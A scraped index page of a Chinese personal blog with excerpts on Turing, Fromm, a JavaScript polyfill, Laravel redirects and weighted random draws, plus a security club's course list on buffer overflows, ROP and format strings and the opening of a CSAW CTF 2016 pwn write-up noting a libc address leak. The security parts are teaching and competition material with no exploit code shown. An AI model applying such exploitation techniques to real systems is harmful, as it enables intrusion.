          可是人生其实本来是没有意义的，你从出生到走向死亡早已安排好，你需要做的就是“重写”这个过程，所以我们来到这个世界上，无非是想要认识些有趣的人、经历些有趣的事情，所以如果你对一件事情的成与败、一件东西得与失，都能做到坦然处之，或许你就不会再畏惧失败，当我们不再愿意为一件事情投入热情的时候，其实我们已经习惯了为自己的懒惰找到一个借口，你必须要相信你做的事情是最正确的事情，你必须要有一种敢于突破自我的激情，否则你注定只能做出平庸而普通的产品;一位同事给我推荐了《模仿游戏》这个电影，在此之前我对图灵这个人物的了解，无外乎他对整个计算机行业做出的革命性的贡献，以及他像谜一样的人生经历，可是通过这部电影，我看到的是一种天才般的疯狂和执著，图灵在被通知去接受破解德国加密装置“恩尼格玛”的任务时，军方对其进行了一个简单的面试，在面试中我们发现图灵或许不懂得什么是幽默，这种被我们称为“书呆子”的性格，在实际生活中是不讨喜的，在《黑客与画家》中作者明确地指出，“书呆子”不受欢迎是因为他们比普通人聪明，可是图灵很快就能发现，团队中有哪些人是不合格的解密者，而在这个过程中他因为不太懂得如何和别人相处，而被团队里的成员指责和谩骂，可他从来没有放弃过制造他的机器，而最终的结果的确是依靠他的机器计算出来的，天才的孤独在于常常不被常人理解，可是当图灵被强迫关闭他的机器的时候，团队中的成员愿意站在这一边，这一幕是让我感受到温情存在的，而这一切来自一个走进他生命中的女孩子：琼;这意味着我们需要去做些疯狂的事情，我们追求极致和完美，是因为我们想在这个世界上，留下属于我们自己的印记，没有人会明白，为什么乔布斯天生就有一种想要和 IBM 抗衡的想法，这种想法促成了让人们印象深刻的"1984"广告，其创意来自乔治·奥威尔的小说《一九八四》，并借助小说中的“大佬”映射当时的蓝色巨人 IBM，这个举动让苹果公司、让 Mac 成为人们心中理想主义的化身，这个举动相当地疯狂，不是吗
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/10/01/%E5%83%8F%E8%AF%97%E4%BA%BA%E4%B8%80%E6%A0%B7%E7%9D%BF%E6%99%BA%EF%BC%8C%E5%83%8F%E5%A4%A9%E6%89%8D%E4%B8%80%E6%A0%B7%E7%96%AF%E7%8B%82/">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/27/106-club-course/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/27/106-club-course/" itemprop="url">106 club course</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-27T02:14:00+08:00">
                2016-09-27
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/tutorial/" itemprop="url" rel="index">
                    <span itemprop="name">tutorial</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <h1 id="106上學期社課"><a href="#106上學期社課" class="headerlink" title="106上學期社課"></a>106上學期社課</h1><h2 id="9-30-第一堂社課"><a href="#9-30-第一堂社課" class="headerlink" title="9&#x2F;30 第一堂社課"></a>9&#x2F;30 第一堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B2dY3bAMpyESRy1nVUsyZ0lvQzQ/view?usp=sharing">Linux_and_SA</a></li>
<li><a target="_blank" rel="noopener" href="https://speakerdeck.com/bananaappletw/python">Python</a></li>
</ul>
<p><a target="_blank" rel="noopener" href="http://cdimage.kali.org/kali-2016.2/kali-linux-2016.2-amd64.iso">Kali iso</a></p>
<p><a target="_blank" rel="noopener" href="http://releases.ubuntu.com/16.04.1/ubuntu-16.04.1-desktop-amd64.iso">Ubuntu iso</a></p>
<h2 id="10-14-第二堂社課"><a href="#10-14-第二堂社課" class="headerlink" title="10&#x2F;14 第二堂社課"></a>10&#x2F;14 第二堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B2WSYFS3T0qOcDNHcl9oTksxZTg/view">Web Security</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=wq9X2qIV-Xg">課程錄影</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=HvhgTF_Upqk">課程錄影</a></li>
</ul>
<h2 id="10-28-第三堂社課"><a href="#10-28-第三堂社課" class="headerlink" title="10&#x2F;28 第三堂社課"></a>10&#x2F;28 第三堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="https://speakerdeck.com/bananaappletw/some-tips">Some tips</a></li>
<li><a target="_blank" rel="noopener" href="https://speakerdeck.com/bananaappletw/x86">x86</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=32PvtalAC2A">課程錄影</a></li>
<li><a target="_blank" rel="noopener" href="https://speakerdeck.com/bananaappletw/gdb">gdb</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=50acU6jrpkg">課程錄影</a></li>
</ul>
<h2 id="11-18-第四堂社課"><a href="#11-18-第四堂社課" class="headerlink" title="11&#x2F;18 第四堂社課"></a>11&#x2F;18 第四堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="https://speakerdeck.com/naetw/buffer-overflow">Buffer overflow</a></li>
<li><a target="_blank" rel="noopener" href="http://people.cs.nctu.edu.tw/~chaoyy1202/Demo.tar.gz">Demo</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=oPAh0fy3eAo">課程錄影</a></li>
</ul>
<h2 id="12-09-第五堂社課"><a href="#12-09-第五堂社課" class="headerlink" title="12&#x2F;09 第五堂社課"></a>12&#x2F;09 第五堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B7_xqQeTuoLpejJ0SFQ5b3dMbWs/view">ROP</a></li>
<li><a target="_blank" rel="noopener" href="http://people.cs.nctu.edu.tw/~jyli8210/ROPDemo.tar.gz">Demo</a></li>
<li><a target="_blank" rel="noopener" href="https://youtu.be/QYmWq2o7MtA">課程錄影</a></li>
</ul>
<hr>
<h1 id="106-下學期社課"><a href="#106-下學期社課" class="headerlink" title="106 下學期社課"></a>106 下學期社課</h1><h2 id="03-03-第一堂社課"><a href="#03-03-第一堂社課" class="headerlink" title="03&#x2F;03 第一堂社課"></a>03&#x2F;03 第一堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B76OxXT0skp6NnZDbVB4UGYycUk/view">Format String</a></li>
<li><a target="_blank" rel="noopener" href="http://people.cs.nctu.edu.tw/~jyli8210/FMTdemo.tar.gz">Demo</a></li>
<li><a target="_blank" rel="noopener" href="https://youtu.be/FvGhDlK36PI">課程錄影 part1</a> &#x2F; <a target="_blank" rel="noopener" href="https://youtu.be/oiicCDA4RNc">part2</a> &#x2F; <a target="_blank" rel="noopener" href="https://youtu.be/o3KXSayMvhw">part3</a></li>
</ul>
<h2 id="03-17-第二堂社課"><a href="#03-17-第二堂社課" class="headerlink" title="03&#x2F;17 第二堂社課"></a>03&#x2F;17 第二堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="http://secprog.cs.nctu.edu.tw/problems/12">題目1</a></li>
<li><a target="_blank" rel="noopener" href="http://secprog.cs.nctu.edu.tw/problems/13">題目2</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=VXbYyYYcvdU">課程錄影</a></li>
</ul>
<h2 id="04-18-第三堂社課"><a href="#04-18-第三堂社課" class="headerlink" title="04&#x2F;18 第三堂社課"></a>04&#x2F;18 第三堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B2WSYFS3T0qOUjRSdDRZUEdBbU0/view?usp=sharing">Crypto 講義</a></li>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B2WSYFS3T0qOc0Q2YTdad3lTMms/view?usp=sharing">題目與工具</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=kURuAjqFv9k">課程錄影 part1</a> &#x2F; <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=qyjaqF6p4hw">part2</a> &#x2F; <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=dkinSlwM5u8">part3</a></li>
</ul>
<h2 id="04-28-第四堂社課"><a href="#04-28-第四堂社課" class="headerlink" title="04&#x2F;28 第四堂社課"></a>04&#x2F;28 第四堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="https://drive.google.com/file/d/0B2WSYFS3T0qOZ04xekRnZDRUZmc/view">Length Extension Attack</a></li>
</ul>
<h2 id="05-05-第五堂社課"><a href="#05-05-第五堂社課" class="headerlink" title="05&#x2F;05 第五堂社課"></a>05&#x2F;05 第五堂社課</h2><ul>
<li><a target="_blank" rel="noopener" href="https://hackmd.io/p/BkKNiQzee#/">Web Security Basic</a></li>
<li><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=jENhKE2yTOU&feature=youtu.be">課程錄影</a></li>
</ul>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/26/2016/browser-compatibility-of-string-prototype-endswith/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/26/2016/browser-compatibility-of-string-prototype-endswith/" itemprop="url">String.prototype.endsWith() 的浏览器兼容性问题</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-26T22:28:29+08:00">
                2016-09-26
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
                    <span itemprop="name">技术</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <p><code>String.prototype.endsWith()</code> 这个方法是 ECMA6 新加入的，而我当初随手 Google 了一下，也没怎么看就直接用上去了，直到我今天在一台破手机上测试的时候发现有个用到这个方法的值神秘地变成了 <code>undefined</code> ( ´_ゝ&#96;)</p>
<p>我记得上次好像也是这样随手搜索导致使用了不兼容的函数 ( -д-) <del>论面向搜索引擎编程的坏处</del></p>
<p>不过我们还是可以通过扩展 <code>String</code> 的原型来实现在不支持的浏览器上使用这个方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 代码来自 MDN</span><br><span class="line"> *</span><br><span class="line"> * @link https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/endsWith</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">if (!String.prototype.endsWith) &#123;</span><br><span class="line">  String.prototype.endsWith = function(searchString, position) &#123;</span><br><span class="line">      var subjectString = this.toString();</span><br><span class="line">      if (typeof position !== &#x27;number&#x27; || !isFinite(position) || Math.floor(position) !== position || position &gt; subjectString.length) &#123;</span><br><span class="line">        position = subjectString.length;</span><br><span class="line">      &#125;</span><br><span class="line">      position -= searchString.length;</span><br><span class="line">      var lastIndex = subjectString.lastIndexOf(searchString, position);</span><br><span class="line">      return lastIndex !== -1 &amp;&amp; lastIndex === position;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/24/2016/use-laravel-redirector-to-redirect-to-any-url/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/24/2016/use-laravel-redirector-to-redirect-to-any-url/" itemprop="url">使用 Laravel 的 RedirectResponse 重定向至任意 URL</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-24T23:32:18+08:00">
                2016-09-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
                    <span itemprop="name">技术</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>Laravel 允许我们在控制器中返回一个 <code>Illuminate\Http\RedirectResponse</code> 的实例来执行重定向。根据文档，我们可以通过 <code>redirect()</code> 帮助函数或者 <code>Redirect</code> Facade 来生成实例，并且可以方便得重定向至命名路由、控制器行为等。</p>
<blockquote>
<p>但如果我们想要重定向至自定义 URL 呢？</p>
</blockquote>
<p>对于这样的需求，Laravel 官方的文档是<strong>完全</strong>没有提及的（至少到目前 5.3 是这样），所以估计很多人都是自己实现了一个使用 <code>header()</code> 或者 <code>&lt;meta http-equiv=&#39;Refresh&#39; content=&#39;&#39;&gt;</code> 的重定向函数（包括以前的我）。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/09/24/2016/use-laravel-redirector-to-redirect-to-any-url/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/24/%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%88%B1%E7%9A%84%E8%89%BA%E6%9C%AF%E5%90%97%EF%BC%9F/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/24/%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%88%B1%E7%9A%84%E8%89%BA%E6%9C%AF%E5%90%97%EF%BC%9F/" itemprop="url">你了解爱的艺术吗？</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-24T22:42:44+08:00">
                2016-09-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
                    <span itemprop="name">读书笔记</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          我们常常表现出，一种试图要要证明比别人过得更好的心态，仿佛在朋友圈或者微博这种社交平台上，我们能找到更多的自豪感，可我同样知道，这个世界上最大的社交网站 Facebook，背后却是由一个有社交障碍的人创造出来的，我们都渴望让别人了解自己、认识自己，这不同于社交场合里那种客套的场面话，对此，弗洛姆认为，人与人之间可以通过讲述这种方式来打破人与生俱来的这种孤独感，“讲述自己的生活，叙述自己的希望和恐惧，谈出自己幼稚的或者不成熟的梦想，以及找到面对世界的共同利益——所有这一切都是克服人与人之间隔离的途径，甚至表露自己的愤怒和仇恨，毫无顾忌地交心也都被看作是亲密的表现”，我们对爱的终极理解其实应该是，我们通过爱一个人，进而爱全人类，爱一切生命，我们从自我的生命的本质出发去爱对方，并且去体验对方的本质，爱情是意志的行为，是人作的一项把全部生命交付对方的决定;爱的确是一门艺术，可对我们每个人而言，它像是某种缥缈甚至是难以揣测的情绪，你不能用一种非常理性的眼光来审视和定义它的存在，弗洛姆说：“不是拥有财物的人是富裕的，而是给予他人东西的人才是富裕者”，可现实是并非你不顾一切地对一个人好，就能赢得一份让你感动的爱情，所以在经历过挫折以后，我不再考虑一味地索取或者付出，我喜欢将这个过程叫做分享，人们在分享的过程中认识彼此、丰富彼此、提高彼此的生命感，这是我认为在爱情中我们需要去挖掘的一种潜质，如果一个人没有生命力，就不会有创造爱情的能力，所以当我们试图爱一个人之前，我们首先要学会爱我们自己，而弗洛伊德将这种人的自我欣赏叫做“自恋”，除了爱情自身积极性的因素以外，爱情具有所有爱的形式所共有的因素，如：关心、责任心、尊重和理解;我们来到这个世界上，更本质的意义在于我们希望认识些有趣的人，做些有趣的事情而已，这意味着我们常常试图在这个世界上留下自己的印记，我们习惯了在朋友圈里晒美食、晒旅游、晒自拍等等约定俗成的处事方法，亦如我们生来就渴望被人理解、被人喜欢一样，而这一切更本质的原因，我们现在称为“刷存在感”，恰恰迎合了这个观点，我们想要在这个世界上留下我们的印记，即使这些方式方法看起来并不是我们最初喜欢的样子，弗洛姆将在这个观点理解为“超越自己”的追求，这一追求属于人的最基本要求，即“人对自己的纯生物作用不满，他不能忍受自己仅仅是被扔进这一世界的小卒
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/09/24/%E4%BD%A0%E4%BA%86%E8%A7%A3%E7%88%B1%E7%9A%84%E8%89%BA%E6%9C%AF%E5%90%97%EF%BC%9F/">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/24/%E4%B8%80%E4%B8%AA%E5%85%B3%E4%BA%8E%E6%A6%82%E7%8E%87%E7%9A%84%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%9D%E8%80%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/24/%E4%B8%80%E4%B8%AA%E5%85%B3%E4%BA%8E%E6%A6%82%E7%8E%87%E7%9A%84%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%9D%E8%80%83/" itemprop="url">一个关于概率的问题的思考</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-24T20:06:45+08:00">
                2016-09-24
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" itemprop="url" rel="index">
                    <span itemprop="name">编程语言</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          在这里 Contract 实现了 IRankable 接口，每个 Contract 的权重由 Level 和 Priority 两个属性来计算，示例中我们一次从集合中随机抽取了 10 个 Contract，而我们的算法能够保证它们都是不重复的，这个程序可以满足各种各样的抽取规则，比如按照 Contract 的口语、职位等不同的维度进行概率模型的建立即可，只要它实现了 IRankable 接口就可以使用这篇文章中的方法来随机抽取，这其实是一个业余时间的小项目啦，可我还是想让自己认真地考虑下这个问题，所以我花时间写了这篇文章，我对它的期望并没有太高，我喜欢将这些想法写下来而已;后者在每次抽取完以后需要将抽中的奖品从奖品池中取出，重新计算概率后方能进行下一轮抽取，所以这里我们直接给出这两两种抽取方法的代码实现，这里需要考虑的一个问题是，在抽取指定数目个“奖品”的时候我们通常不希望出现重复的元素，前者需要我们判断已抽取的奖品列表中是否存在指定元素，而后者因为抽取的奖品会被取出，所以不需要考虑这种情况的处理;好了，现在我们就获得了不同权重物品所对应的累积概率，即其概率范围，因此我们可以利用随机生成[0,1)范围内的随机数，然后判断随机数所在哪个概率范围内，我们就可以知道要对哪个权重分组中的奖品进行抽取，而对每个权重分组来说，因为其权重都是一样的，所以这里抽取试验可以认为是符合随机概率的，我们只需要从该分组中随机选取一个奖品返回就可以啦
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/09/24/%E4%B8%80%E4%B8%AA%E5%85%B3%E4%BA%8E%E6%A6%82%E7%8E%87%E7%9A%84%E9%97%AE%E9%A2%98%E7%9A%84%E6%80%9D%E8%80%83/">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/20/CSAW-CTF-2016-tutorial-200/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/20/CSAW-CTF-2016-tutorial-200/" itemprop="url">[CSAW CTF 2016] tutorial 200</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-20T22:42:00+08:00">
                2016-09-20
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
        
          
            <h1 id="CSAW-CTF-2016-tutorial-200"><a href="#CSAW-CTF-2016-tutorial-200" class="headerlink" title="[CSAW CTF 2016] tutorial 200"></a>[CSAW CTF 2016] tutorial 200</h1><blockquote>
<p>Category: pwn<br>Point: 200<br>Solver: briansp8210 @ BambooFox	</p>
</blockquote>
<h1 id="tutorial"><a href="#tutorial" class="headerlink" title="tutorial"></a>tutorial</h1><p>由於自己對於網路程式設計還沒有概念，而且執行檔在 local 跑不起來，不能用 gdb 觀察，所以看得蠻吃力的。後來感謝 bruce 學長的提點，才順利解出來XD</p>
<h2 id="解題流程"><a href="#解題流程" class="headerlink" title="解題流程"></a>解題流程</h2><p>程式一開始會建立 socket 連線，然後執行 <code>fork</code> 後進入 <code>menu(int socket)</code> 選單。</p>
<ul>
<li>選項 1 會輸出 <code>puts()</code> 的 address 扣掉 1280 的值，可以從這邊推出 libc address。</li>
